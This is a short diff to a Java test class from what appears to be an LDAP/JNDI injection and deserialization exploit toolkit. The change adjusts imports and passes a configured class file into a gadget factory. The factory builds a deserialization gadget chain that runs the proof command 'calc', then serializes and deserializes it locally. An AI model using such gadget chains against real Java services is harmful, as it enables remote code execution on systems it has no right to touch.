@@ -1,15 +1,13 @@
 package com.idiot9.tmp;
 
-import com.idiot9.ldap.enumtypes.EncodingTypes;
 import com.idiot9.ldap.gadgets.GadgetFactory;
 import com.idiot9.ldap.gadgets.utils.Reflections;
 import com.idiot9.ldap.gadgets.utils.TemplatesCreator;
+import com.idiot9.ldap.utils.Config;
 
 import javax.naming.InitialContext;
 import javax.naming.NamingException;
 import javax.xml.transform.Templates;
-import java.io.IOException;
-import java.lang.reflect.Constructor;
 import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
@@ -35,7 +33,7 @@ public class Test {
 
     public static void gadgetTest(String gadget) throws Exception {
         Class<? extends GadgetFactory> gadgetClass = GadgetFactory.Utils.getGadgetClass(gadget);
-        Object gadgetObject = GadgetFactory.Utils.getGadgetObject(gadgetClass, "calc", null, null);
+        Object gadgetObject = GadgetFactory.Utils.getGadgetObject(gadgetClass, Config.classFile, "calc", null, null);
         byte[] ser = Reflections.ser(gadgetObject);
         Reflections.deser(ser);
     }
